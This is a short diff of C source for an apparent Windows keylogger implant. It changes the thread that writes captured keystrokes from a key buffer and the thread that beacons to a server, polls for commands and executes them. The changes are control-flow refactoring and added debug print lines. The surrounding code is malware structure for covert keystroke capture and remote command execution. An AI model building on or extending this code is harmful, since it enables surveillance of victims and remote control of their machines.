@@ -124,11 +124,10 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
     while (!ctx->shutdown) {
         Sleep(SLP_WRITER_THREAD);
         WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
+        printf("Writing...\n");
         
         // skip the write if the buffer is empty
-        if (ctx->kLogger->bufferPtr == 0) {            
-            goto skipWrite;
-        }
+        if (ctx->kLogger->bufferPtr == 0) { goto skipWrite; }
 
         // tries the to write the key buffer at max 3 times
         int ret = ECODE_POST;
@@ -152,20 +151,21 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
 DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
     while (!ctx->shutdown) {
         Sleep(SLP_CMD_THREAD);
-
         WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
-        CLIENT_HANDLER* client = ctx->client;
 
-        // get the commands from the server
-        ERR_CODE ret = pollCommandsAndBeacon(client);
-        if (ret != ECODE_SUCCESS) { printErr(ret); }
-        
-        // only try and execute the commands if there is something to exec.
-        if (strlen(client->cmdBuffer) > 0) {
-            ret = processCommands(client);
-            if (ret == ECODE_DO_SHUTDOWN) { doShutdown(); }
-            if (ret != ECODE_SUCCESS)     { printErr(ret); }
+        ERR_CODE ret = pollCommandsAndBeacon(ctx->client); printf("Polling...\n");
+
+        // only execute the commands if there is something to exec. or an err was not found
+        if (ret != ECODE_SUCCESS) {
+            printErr(ret); 
+            goto skipCmds;
         }
+        
+        ret = processCommands(ctx->client);
+        if (ret == ECODE_DO_SHUTDOWN) { doShutdown(); }
+        if (ret != ECODE_SUCCESS)     { printErr(ret); }
+        
+        skipCmds:
         ReleaseMutex(ctx->hMutexThreadSync);
     }
     return 0;
